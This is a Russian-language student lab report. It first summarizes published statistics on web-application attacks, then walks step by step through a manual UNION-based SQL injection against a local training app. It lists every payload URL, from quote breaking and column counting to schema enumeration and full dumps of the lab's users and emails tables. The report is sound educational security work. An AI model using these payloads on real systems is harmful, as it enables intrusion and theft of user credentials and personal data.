# Лабораторная работа 2
## Симуляция атаки по OWASP Top 10 Web: SQL Injection

**Дата выполнения:** 25.04.2026

### Цель работы
1. Собрать статистику по атакам через веб-приложения и веб-уязвимости.
2. На практике получить чувствительные данные из учебного веб-приложения через SQL-инъекцию.


## Часть I. Статистика по атакам через веб-приложения и веб-уязвимости

### Источники
1. Positive Technologies, "AppSec Table Top: методология безопасной разработки от Positive Technologies", 25.09.2024:
   https://ptsecurity.com/research/knowledge-base/appsec-table-top-metodologiya-bezopasnoj-razrabotki-ot-positive-technologies/
2. Kaspersky Securelist, "ТОР10 уязвимостей в веб-приложениях в 2021-2023 годах", 12.03.2024:
   https://securelist.ru/top-10-web-app-vulnerabilities/109215/
3. DSEC by Solar, "Ключевые уязвимости информационных систем российских компаний в 2025 году":
   https://rt-solar.ru/analytics/reports/6479/
4. Verizon, "2025 Data Breach Investigations Report. Executive Summary":
   https://www.verizon.com/business/resources/reports/2025-dbir-executive-summary.pdf
5. OWASP, "OWASP Top 10:2025 Introduction":
   https://owasp.org/Top10/2025/0x00_2025-Introduction/

### Краткий вывод по доле атак через веб

1. Россия, 2023-2024, Positive Technologies:
   По данным Positive Technologies, 21% атак в России за 2023-2024 годы пришелся на веб-приложения. В том же материале отмечено, что эксплуатация уязвимостей на протяжении пяти лет входит в тройку популярных методов атак на организации.

2. Мир, 2025, Verizon DBIR:
   В Verizon DBIR 2025 проанализировано 22 052 инцидента, из них 12 195 подтвержденных утечек/компрометаций данных. В распределении паттернов атак Basic Web Application Attacks занимают 12% подтвержденных breaches в 2025 году. При этом эксплуатация уязвимостей как вектор первоначального доступа достигла 20% breaches, а credential abuse остается рядом - 22%.

3. Россия, внешний периметр и веб-приложения, DSEC by Solar 2025:
   В 47% исследованных веб-приложений была найдена хотя бы одна критическая уязвимость. Более половины веб-приложений имели уровень защищенности "низкий", "ниже среднего" или "средний", то есть успешная эксплуатация найденных проблем могла нанести ущерб информационным активам компании.

Так как разные источники используют разные scope, итоговый диапазон получается таким:
- атаки именно на веб-приложения в России: около 21%;
- Basic Web Application Attacks в глобальной статистике Verizon DBIR 2025: 12% breaches;
- эксплуатация уязвимостей как начальный вектор в глобальной статистике Verizon DBIR 2025: 20% breaches, но это шире, чем только веб-приложения.


### Распределение по конкретным веб-уязвимостям

1. DSEC by Solar, критические уязвимости веб-приложений в российских проектах 2025 года:
- Недостатки контроля доступа: 46%.
- Внедрение произвольного SQL-кода в запрос: 14%.
- Межсайтовое внедрение сценариев, XSS: 10%.
- Недостатки бизнес-логики: 9%.
- Отказ в обслуживании: 8%.

Дополнительно DSEC указывает, что 61% всех критических уязвимостей веб-приложений имели высокую вероятность эксплуатации.

2. DSEC by Solar, критические уязвимости внешнего периметра 2025 года:
- Недостатки контроля доступа: 33%.
- Использование ПО с известными уязвимостями: 28%.
- Использование слабых и словарных паролей: 20%.
- Внедрение произвольного SQL-кода в запрос: 20%.
- Выполнение произвольного кода: 13%.

3. Kaspersky Securelist, проекты анализа защищенности веб-приложений за 2021-2023 годы, преимущественно Россия, Китай и Ближний Восток:
- 1 место: недостатки контроля доступа. Такие проблемы были в 70% проанализированных приложений.
- 2 место: раскрытие чувствительной информации.
- 3 место: SSRF. Более половины приложений, 57%, содержали такую уязвимость.
- 4 место: SQL Injection. Такая уязвимость была в 43% приложений.
- 5 место: XSS. Такая уязвимость была в 61% приложений, но чаще имела средний уровень риска.
- 6 место: недостатки аутентификации.
- 7 место: небезопасная конфигурация. Чуть меньше половины приложений.
- 8 место: недостаточная защита от перебора пароля. Более трети приложений.
- 9 место: слабый пароль пользователя. 22% приложений.
- 10 место: использование компонентов с известными уязвимостями.

4. OWASP Top 10:2025, международная классификация рисков веб-приложений:
- A01: Broken Access Control.
- A02: Security Misconfiguration.
- A03: Software Supply Chain Failures.
- A04: Cryptographic Failures.
- A05: Injection.
- A06: Insecure Design.
- A07: Authentication Failures.
- A08: Software or Data Integrity Failures.
- A09: Security Logging & Alerting Failures.
- A10: Mishandling of Exceptional Conditions.

OWASP отмечает, что Broken Access Control остается самым серьезным риском веб-приложений; Injection в версии 2025 находится на 5 месте, но включает SQL Injection как один из наиболее опасных вариантов.


## Часть II. Практическая SQL-инъекция

### Подготовка
Docker-контейнеры с учебным приложением уже были запущены локально. Веб-приложение доступно на:
http://localhost:8080/

Использованные контейнеры:
- web: ket9/otus-devsecops:latest, порт 8080 -> 80;
- db: mysql:5.7, порт 8989 -> 3306.

Перед выполнением задания база была сброшена/установлена штатной ссылкой:
http://localhost:8080/sql-connections/setup-db.php

Автоматические средства вроде sqlmap не использовались. Данные из контейнера или напрямую из MySQL не извлекались; все результаты получены через HTTP-запросы к странице задания.


### Ход рассуждений

1. Открыл главную страницу и страницу задания. Страница просит передать параметр id.

2. Проверил обычные значения id:
   id=1 вернул пользователя admin.
   id=2 вернул пользователя Volk.
   Значит параметр id участвует в SQL-запросе к таблице пользователей.

3. Проверил апостроф:
   id=1' вернул SQL-ошибку:
   You have an error in your SQL syntax ... near ''1'' LIMIT 0,1'
   Из этого сделал вывод, что параметр подставляется внутрь кавычек, примерно так:
   WHERE id='$id' LIMIT 0,1

4. Поэтому дальнейшая инъекция строилась по схеме:
   закрыть кавычку через %27, добавить SQL-код, закомментировать остаток запроса через %23.

5. Проверил число колонок через ORDER BY:
   ORDER BY 2 и ORDER BY 3 прошли без ошибки.
   ORDER BY 4 дал ошибку Unknown column '4' in 'order clause'.
   Значит исходный SELECT возвращает 3 колонки.

6. Проверил UNION SELECT:
   UNION SELECT 1,2,3 сработал.
   На странице отображаются первая и вторая колонки результата: "Ваш id" и "Ваш логин".

7. Получил имя базы и версию MySQL:
   database() -> security
   version() -> 5.7.44

8. Получил таблицы текущей базы:
   emails, users

9. Получил колонки:
   users: id, username, password
   emails: id, email_id

10. Получил данные таблицы users и нашел пользователя Volk2:
   id=9, username=Volk2, password=Wa spoiuuuuu

11. Получил данные таблицы emails и сопоставил их с users по id. Пользователь Vinni-pukh имеет id=4, его почта:
   honey_lover@otus-lab.com


### Ответы на задания

1. Пароль пользователя Volk2:
   Wa spoiuuuuu

2. Почта пользователя Vinni-pukh:
   honey_lover@otus-lab.com


### Все отправленные URL и результаты

1. http://localhost:8080/
   Результат: главная страница, ссылки на setup-db.php и /task.

2. http://localhost:8080/robots.txt
   Результат: 404 Not Found. Не помогло.

3. http://localhost:8080/sql-connections/setup-db.php
   Результат: база данных успешно обновлена.

4. http://localhost:8080/task
   Результат: страница задания, сообщение "Введите в качестве параметра ваш id".

5. http://localhost:8080/task?id=1
   Результат: id=1, login=admin.

6. http://localhost:8080/task/?id=1
   Результат: id=1, login=admin.

7. http://localhost:8080/task?id=2
   Результат: id=2, login=Volk.

8. http://localhost:8080/task?id=1%20ORDER%20BY%202
   Результат: вернулся admin. Без закрытия кавычки инъекция фактически не сработала.

9. http://localhost:8080/task?id=1%20ORDER%20BY%203
   Результат: вернулся admin. Без закрытия кавычки инъекция фактически не сработала.

10. http://localhost:8080/task?id=-1%20UNION%20SELECT%201,2
    Результат: пустой вывод. Без закрытия кавычки UNION не сработал.

11. http://localhost:8080/task?id=1%27
    Результат: SQL-ошибка около ''1'' LIMIT 0,1. Это подтвердило инъекцию внутри кавычек.

12. http://localhost:8080/task?id=1%27%20ORDER%20BY%202%23
    Результат: запрос прошел, вернулся admin.

13. http://localhost:8080/task?id=1%27%20ORDER%20BY%203%23
    Результат: запрос прошел, вернулся admin.

14. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,2%23
    Результат: ошибка The used SELECT statements have a different number of columns.

15. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,%27test%27%23
    Результат: ошибка The used SELECT statements have a different number of columns.

16. http://localhost:8080/task?id=1%27%20ORDER%20BY%204%23
    Результат: ошибка Unknown column '4' in 'order clause'. Значит колонок 3.

17. http://localhost:8080/task?id=1%27%20ORDER%20BY%205%23
    Результат: ошибка Unknown column '5' in 'order clause'.

18. http://localhost:8080/task?id=1%27%20ORDER%20BY%206%23
    Результат: ошибка Unknown column '6' in 'order clause'.

19. http://localhost:8080/task?id=1%27%20ORDER%20BY%2010%23
    Результат: ошибка Unknown column '10' in 'order clause'.

20. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,2,3%23
    Результат: id=1, login=2. UNION на 3 колонки работает.

21. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,%27col2%27,%27col3%27%23
    Результат: id=1, login=col2. Вторая колонка выводится как логин.

22. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20%27col1%27,%27col2%27,%27col3%27%23
    Результат: id=col1, login=col2. Первая и вторая колонки отображаются на странице.

23. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,database(),3%23
    Результат: database() = security.

24. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,version(),3%23
    Результат: version() = 5.7.44.

25. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%23
    Результат: таблицы emails,users.

26. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20AND%20table_name=%27users%27%23
    Результат: колонки users: id,username,password.

27. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20AND%20table_name=%27emails%27%23
    Результат: колонки emails: id,email_id.

28. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(table_name,0x3a,column_name),3%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%23
    Результат: emails:id, emails:email_id, users:id, users:username, users:password.

29. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(id,0x3a,username,0x3a,password),3%20FROM%20users%23
    Результат: дамп users:
    1:admin:kjhsd8@j0dfjk3$%jksli,
    2:Volk:nu zayzc, nu pogodi!,
    3:Matroskin:a ya vse chawe zame4aiu, 4to menya kak budto kto-to podmenil,
    4:Vinni-pukh:Ya tu4ka-tu4ka-tu4ka,
    5:Neznaika:na Lune,
    6:kotenok:Gav,
    7:Karlson:muwchina v samom rascvete sil,
    8:Kesha:pust vsegda budet Vovka,
    9:Volk2:Wa spoiuuuuu.

30. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,concat(id,0x3a,username,0x3a,password),3%20FROM%20users%20WHERE%20username=%27Volk2%27%23
    Результат: 9:Volk2:Wa spoiuuuuu.

31. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(id,0x3a,email_id),3%20FROM%20emails%23
    Результат: дамп emails:
    1:admin@otus-lab.com,
    2:volchara1969@otus-lab.com,
    3:matroskin_is_prostokvashino@otus-lab.com,
    4:honey_lover@otus-lab.com,
    5:ne.znaika@otus-lab.com,
    6:kotenok@otus-lab.com,
    7:karlson@otus-lab.com,
    9:volk@otus-lab.com.

32. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,concat(users.username,0x3a,emails.email_id),3%20FROM%20users%20JOIN%20emails%20ON%20users.id=emails.id%20WHERE%20users.username=%27Vinni-pukh%27%23
    Результат: Vinni-pukh:honey_lover@otus-lab.com.

33. http://localhost:8080/task?id=4
    Результат: id=4, login=Vinni-pukh.

34. http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,email_id,3%20FROM%20emails%20WHERE%20id=4%23
    Результат: honey_lover@otus-lab.com.


### Итог
SQL-инъекция относится к категории OWASP Injection. В учебном приложении параметр id не фильтровался и подставлялся в SQL-запрос в кавычках. Через закрытие кавычки, UNION SELECT и чтение information_schema удалось определить структуру базы и получить чувствительные данные пользователей.


